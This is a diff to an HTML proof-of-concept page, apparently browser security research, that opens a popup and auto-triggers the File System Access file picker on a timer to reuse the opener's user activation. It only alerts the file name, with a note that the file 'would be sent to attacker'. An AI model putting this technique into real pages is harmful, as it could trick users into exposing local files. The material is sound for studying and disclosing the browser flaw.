@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Popup Demo</title>
+    <title>Auto Trigger File Picker in Popup</title>
     <style>
         body {
             display: flex;
@@ -31,12 +31,53 @@
     </style>
 </head>
 <body>
-    <button id="openPopupBtn">Open Popup</button>
+    <button id="openPopupBtn">Open Popup (Auto trigger file picker)</button>
 
     <script>
         document.getElementById('openPopupBtn').addEventListener('click', function() {
-            // Ukuran popup bisa disesuaikan
-            window.open('https://nuribnuu.github.io/poc-security/filepicker-spoofing1/', '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
+            // Buka popup dan tulis konten yang langsung menjalankan file picker
+            const popup = window.open('', '_blank', 'width=800,height=600,scrollbars=yes,resizable=yes');
+            if (!popup) {
+                alert("Popup blocked! Please allow popups.");
+                return;
+            }
+            popup.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Auto File Picker</title>
+                    <style>
+                        body { text-align: center; margin-top: 50px; font-family: Arial; }
+                        #status { margin-top: 20px; color: blue; }
+                    </style>
+                </head>
+                <body>
+                    <h3>Automatically triggering file picker...</h3>
+                    <div id="status">Initializing...</div>
+                    <script>
+                        // Fungsi untuk memicu file picker
+                        async function triggerFilePicker() {
+                            try {
+                                const filePromise = window.showOpenFilePicker();
+                                document.getElementById('status').innerText = 'File picker opened. Select a file.';
+                                const [handle] = await filePromise;
+                                const file = await handle.getFile();
+                                alert('File selected: ' + file.name + ' (this would be sent to attacker)');
+                                document.getElementById('status').innerText += '\\nFile selected: ' + file.name;
+                            } catch (err) {
+                                console.error(err);
+                                document.getElementById('status').innerText = 'Error: ' + err.message;
+                            }
+                        }
+                        // Coba panggil langsung (menggunakan activation dari induk?)
+                        // Beberapa browser mungkin mengizinkan jika dipanggil dalam waktu singkat.
+                        setTimeout(triggerFilePicker, 10);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            popup.document.close();
+            popup.focus();
         });
     </script>
 </body>
